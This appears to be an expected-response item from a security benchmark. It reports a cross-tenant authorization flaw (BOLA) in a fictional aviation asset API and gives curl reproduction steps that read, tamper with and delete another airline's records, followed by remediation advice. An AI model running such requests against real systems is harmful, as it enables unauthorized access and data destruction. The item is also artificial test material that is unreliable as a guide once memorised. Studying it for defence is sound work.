# Expected Response

## System
- System: AeroOps Flight Management v1.7.0
- Domain: AVIATION / FLIGHT OPS
- Example ID: BOLA-0087
- Risk ID: RISK-53-087

## Findings

### 1. Pattern 5.3 — User-Controlled URL Path Parameter Bypasses Authorization: Cross-Tenant Flight Asset DELETE on `/api/v3/assets/:id` (HAR Primary)

The `GET/PATCH/DELETE /api/v3/assets/:id` endpoint uses the user-controlled URL path `asset_id` as the sole lookup key. The backend resolves whichever asset ID the caller provides — no ownership or tenant check is applied. An attacker substitutes a cross-tenant `asset_id` in the URL to access, corrupt, or destroy another airline's flight operations assets (aircraft registry, maintenance plans, fleet records).

**Evidence from HAR:**
- Request: `DELETE /api/v3/assets/ASS-2087` from `ORG-0E38` (`X-Tenant-ID: ORG-0E38`)
- Response `tenantId: "ORG-3337"` — cross-tenant aviation asset deletion confirmed
- HTTP status: 200 — no authorization check triggered
- Response returns deleted asset's `sensitiveData: "CONFIDENTIAL: cross-tenant data for ORG-3337"`

In Aviation, asset deletion without authorization could remove active aircraft from the flight management system — an FAA/EASA safety-critical data integrity violation.

## Reproduction

**Step 1 — Baseline:**
```bash
curl -s "https://api.aeroops-flight-.example.com/api/v3/assets/ASS-1087" \
  -H "Authorization: Bearer <TOKEN_TENANT_ORG-0E38>" \
  -H "X-Tenant-ID: ORG-0E38"
```
**Expected:** Returns own aviation asset with `tenantId: "ORG-0E38"`.

**Step 2 — Cross-tenant aviation asset DELETE: user-controlled URL (primary HAR attack):**
```bash
curl -s -X DELETE "https://api.aeroops-flight-.example.com/api/v3/assets/ASS-2087" \
  -H "Authorization: Bearer <TOKEN_TENANT_ORG-0E38>" \
  -H "X-Tenant-ID: ORG-0E38"
```
**Vulnerable outcome:** Returns `tenantId: "ORG-3337"` — another airline's flight operations asset deleted.

**Step 3 — PATCH: tamper with cross-tenant flight asset data:**
```bash
curl -s -X PATCH "https://api.aeroops-flight-.example.com/api/v3/assets/ASS-2087" \
  -H "Authorization: Bearer <TOKEN_TENANT_ORG-0E38>" \
  -H "X-Tenant-ID: ORG-0E38" \
  -H "Content-Type: application/json" \
  -d '{"status": "grounded", "sensitive_data": "flight_asset_tampered_by_competitor"}'
```
**Vulnerable outcome:** Competitor's aircraft status set to `grounded` — flight operations disruption, potential safety/regulatory impact.

**Step 4 — GET: read cross-tenant aviation intelligence:**
```bash
curl -s "https://api.aeroops-flight-.example.com/api/v3/assets/ASS-2087" \
  -H "Authorization: Bearer <TOKEN_TENANT_ORG-0E38>" \
  -H "X-Tenant-ID: ORG-0E38"
```
**Vulnerable outcome:** Returns competitor airline's fleet/maintenance records — aviation competitive intelligence.

## Secure Outcome
```json
{ "error": "Forbidden", "code": 403 }
```

## Remediation
- Add `WHERE asset_id = $id AND owner_id = $jwtSub AND tenant_id = $jwtTenantId` to all asset queries (RISK-53-087).
- Validate ownership before any write operation (PATCH, DELETE) on aviation assets.
- Centralize authorization middleware: never resolve asset IDs from URL without tenant check.
- Use non-sequential UUIDs for asset IDs to reduce enumeration risk.
- FAA/EASA audit log: record all modifications to flight management assets.
